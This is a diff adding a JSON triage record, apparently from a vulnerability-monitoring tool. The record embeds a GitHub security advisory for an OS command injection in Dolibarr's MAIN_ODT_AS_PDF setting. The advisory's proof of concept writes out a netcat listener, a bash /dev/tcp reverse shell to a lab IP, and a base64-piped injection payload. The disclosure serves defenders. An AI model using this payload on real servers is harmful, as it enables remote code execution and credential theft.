@@ -1,0 +1,57 @@
+{
+  "ai": {
+    "affected_assets": [],
+    "evidence_urls": [],
+    "exposure_conditions": [],
+    "recommended_actions": [],
+    "status": "pending",
+    "uncertainties": []
+  },
+  "body_excerpt": "{\"credits\": [{\"type\": \"reporter\", \"user\": {\"avatar_url\": \"https://avatars.githubusercontent.com/u/185241918?v=4\", \"events_url\": \"https://api.github.com/users/lukasz-rybak/events{/privacy}\", \"followers_url\": \"https://api.github.com/users/lukasz-rybak/followers\", \"following_url\": \"https://api.github.com/users/lukasz-rybak/following{/other_user}\", \"gists_url\": \"https://api.github.com/users/lukasz-rybak/gists{/gist_id}\", \"gravatar_id\": \"\", \"html_url\": \"https://github.com/lukasz-rybak\", \"id\": 185241918, \"login\": \"lukasz-rybak\", \"node_id\": \"U_kgDOCwqRPg\", \"organizations_url\": \"https://api.github.com/users/lukasz-rybak/orgs\", \"received_events_url\": \"https://api.github.com/users/lukasz-rybak/received_events\", \"repos_url\": \"https://api.github.com/users/lukasz-rybak/repos\", \"site_admin\": false, \"starred_url\": \"https://api.github.com/users/lukasz-rybak/starred{/owner}{/repo}\", \"subscriptions_url\": \"https://api.github.com/users/lukasz-rybak/subscriptions\", \"type\": \"User\", \"url\": \"https://api.github.com/users/lukasz-rybak\", \"user_view_type\": \"public\"}}], \"cve_id\": \"CVE-2026-23500\", \"cvss\": {\"score\": 9.1, \"vector_string\": \"CVSS:3.1/AV:N/AC:L/PR:H/UI:N/S:C/C:H/I:H/A:H\"}, \"cvss_severities\": {\"cvss_v3\": {\"score\": 9.1, \"vector_string\": \"CVSS:3.1/AV:N/AC:L/PR:H/UI:N/S:C/C:H/I:H/A:H\"}, \"cvss_v4\": {\"score\": 9.4, \"vector_string\": \"CVSS:4.0/AV:N/AC:L/AT:N/PR:H/UI:N/VC:H/VI:H/VA:H/SC:H/SI:H/SA:H\"}}, \"cwes\": [{\"cwe_id\": \"CWE-78\", \"name\": \"Improper Neutralization of Special Elements used in an OS Command ('OS Command Injection')\"}], \"description\": \"### Summary\\nAn authenticated administrator can execute arbitrary operating system commands by injecting a malicious payload into the `MAIN_ODT_AS_PDF` configuration constant. This vulnerability exists because the application fails to properly validate or escape the command path before passing it to the `exec()` function in the ODT to PDF conversion process.\\n\\n### Details\\nThe vulnerability is located in `htdocs/includes/odtphp/odf.php`.\\nWhen the system tries to convert an ODT document to PDF (e.g., in Proposals, Invoices), it constructs a shell command using the `MAIN_ODT_AS_PDF` global setting.\\n\\nCode snippet (`htdocs/includes/odtphp/odf.php`, approx line 930):\\n```php\\n$command = getDolGlobalString('MAIN_ODT_AS_PDF').' '.escapeshellcmd($name);\\n// ...\\nexec($command, $output_arr, $retval);\\n```\\n\\nWhile the filename `$name` is sanitized using `escapeshellcmd()`, the configuration variable `MAIN_ODT_AS_PDF` is retrieved directly from the database and concatenated at the beginning of the string. An attacker with administrative privileges can set this variable to include a command separator (like `;`) followed by arbitrary commands.\\n\\n### PoC\\n**Prerequisites:**\\n1. Login as an Administrator.\\n2. Ensure the \\\"Commercial Proposals\\\" module is enabled and \\\"ODT templates\\\" are activated in its setup.\\n\\n**Steps to reproduce (Reverse Shell):**\\n\\n1.  Start a netcat listener on the attacker's machine (IP: `172.26.0.1`, Port: `4445`):\\n   ```bash\\n   nc -lvnp 4445\\n   ```\\n\\n2. Prepare the payload. To avoid issues with special characters (like `&` or `>`) being escaped by the web application or shell, encode the reverse shell command in Base64:\\n   ```bash\\n   # Command: bash -c 'bash -i >& /dev/tcp/172.26.0.1/4445 0>&1'\\n   echo \\\"bash -c 'bash -i >& /dev/tcp/172.26.0.1/4445 0>&1'\\\" | base64\\n   # Output: YmFzaCAtYyAnYmFzaCAtaSA+JiAvZGV2L3RjcC8xNzIuMjYuMC4xLzQ0NDUgMD4mMScK\\n   ```\\n\\n3. Navigate to **Home -> Setup -> Other Setup**.\\n\\n4. Add or modify the constant `MAIN_ODT_AS_PDF` with the following injection payload:\\n   ```bash\\n   jodconverter; echo YmFzaCAtYyAnYmFzaCAtaSA+JiAvZGV2L3RjcC8xNzIuMjYuMC4xLzQ0NDUgMD4mMScK | base64 -d | bash\\n   ```\\n   *(Explanation: `jodconverter` satisfies the initial check, `;` acts as a command separator, and the pipeline decodes and executes the Base64 payload).*\\n<img width=\\\"1898\\\" height=\\\"696\\\" alt=\\\"image\\\" src=\\\"https://github.com/user-attachments/assets/12e4aa61-eb9d-4342-bd03-9a1e824b8316\\\" />\\n\\n5. Navigate to **Commerce -> New proposal**, create a draft, select an ODT template (e.g., `generic_proposal_odt`), and click **Generate**.\\n<img width=\\\"1907\\\" height=\\\"668\\\" alt=\\\"image\\\" src=\\\"https://github.com/user-attachments/assets/d790847e-50c1-47eb-994b-b2596b949242\\\" />\\n<img width=\\\"1858\\\" height=\\\"346\\\" alt=\\\"image\\\" src=\\\"https://github.com/user-attachments/assets/afbeb170-d004-49d6-a395-1b4572fbf2e7\\\" />\\n<img width=\\\"848\\\" height=\\\"183\\\" alt=\\\"image\\\" src=\\\"https://github.com/user-attachments/assets/93fbe6c9-96a8-4d0f-ad0e-4aea69f0fec1\\\" />\\n\\n6. Check the netcat listener. A connection will be established, granting a shell on the server:\\n \\n<img width=\\\"616\\\" height=\\\"193\\\" alt=\\\"image\\\" src=\\\"https://github.com/user-attachments/assets/e90817da-9bb2-4fe1-8377-be10d8640e37\\\" />\\n\\n\\n### Impact\\n**Remote Code Execution (RCE).**\\nAn attacker who gains access to an administrator account (or a malicious administrator) can execute arbitrary commands on the underlying server with the privileges of the web server user (typically `www-data`). This allows for:\\n- Reading sensitive configuration files (database credentials).\\n- Modifying application code.\\n- Full system compromise depending on server configuration (e.g., docker escape, pivoting).\\n\\n---\\n\\n### Credits\\nReported by Łukasz Rybak\", \"epss\": {\"percentage\": 0.00922, \"percentile\": 0.55629}, \"ghsa_id\": \"GHSA-w5j3-8fcr-h87w\", \"github_reviewed_at\": \"2026-04-17T21:24:48Z\", \"html_url\": \"https://github.com/advisories/GHSA-w5j3-8fcr-h87w\", \"identifiers\": [{\"type\": \"GHSA\", \"value\": \"GHSA-w5j3-8fcr-h87w\"}, {\"type\": \"CVE\", \"value\": \"CVE-2026-23500\"}], \"nvd_published_at\": \"2026-04-17T21:16:31Z\", \"published_at\": \"2026-04-17T21:24:48Z\", \"references\": [\"https://github.com/Dolibarr/dolibarr/security/advisories/GHSA-w5j3-8fcr-h87w\", \"https://nvd.nist.gov/vuln/detail/CVE-2026-23500\", \"https://github.com/Dolibarr/dolibarr/releases/tag/23.0.0\", \"https://github.com/advisories/GHSA-w5j3-8fcr-h87w\"], \"repository_advisory_url\": \"https://api.github.com/repos/Dolibarr/dolibarr/security-advisories/GHSA-w5j3-8fcr-h87w\", \"severity\": \"critical\", \"source_code_location\": \"https://github.com/Dolibarr/dolibarr\", \"summary\": \"Dolibarr: OS Command Injection (RCE) via MAIN_ODT_AS_PDF configuration\", \"type\": \"reviewed\", \"updated_at\": \"2026-05-06T22:23:05Z\", \"url\": \"https://api.github.com/advisories/GHSA-w5j3-8fcr-h87w\", \"vulnerabilities\": [{\"first_patched_version\": null, \"package\": {\"ecosystem\": \"composer\", \"name\": \"dolibarr/dolibarr\"}, \"vulnerable_functions\": [], \"vulnerable_version_range\": \"<= 22.0.4\"}], \"withdrawn_at\": null}",
+  "canonical_id": "github:ghsa-w5j3-8fcr-h87w",
+  "decision": {
+    "priority": "INFO",
+    "reasons": [
+      "資産不一致または判定情報不足"
+    ]
+  },
+  "enrichment": {
+    "asset_match": false,
+    "cisa_kev": false,
+    "internet_exposed": false,
+    "matched_asset_ids": []
+  },
+  "facts": {
+    "affected_versions": [
+      "dolibarr/dolibarr: <= 22.0.4"
+    ],
+    "authentication_required": true,
+    "cves": [
+      "CVE-2026-23500"
+    ],
+    "cvss_score": 9.1,
+    "cvss_vector": "CVSS:3.1/AV:N/AC:L/PR:H/UI:N/S:C/C:H/I:H/A:H",
+    "fixed_versions": [],
+    "mitigations": [],
+    "products": [
+      "dolibarr/dolibarr"
+    ],
+    "remote": true,
+    "vendor_severity": "critical"
+  },
+  "first_seen_at": "2026-07-20T19:52:03.689792Z",
+  "provenance": {
+    "content_sha256": "7550ee2f743345c2fc49208d1228ce7baebe3773e9f3ab8eabed00babdbb0702",
+    "extractor_version": "0.1.0",
+    "source_type": "json_api"
+  },
+  "published_at": "2026-04-17T21:24:48Z",
+  "schema_version": 1,
+  "source_id": "github_advisory_database",
+  "source_url": "https://github.com/advisories/GHSA-w5j3-8fcr-h87w",
+  "status": "active",
+  "title": "Dolibarr: OS Command Injection (RCE) via MAIN_ODT_AS_PDF configuration",
+  "updated_at": "2026-05-06T22:23:05Z",
+  "vendor": "GitHub",
+  "vendor_advisory_id": "GHSA-w5j3-8fcr-h87w"
+}
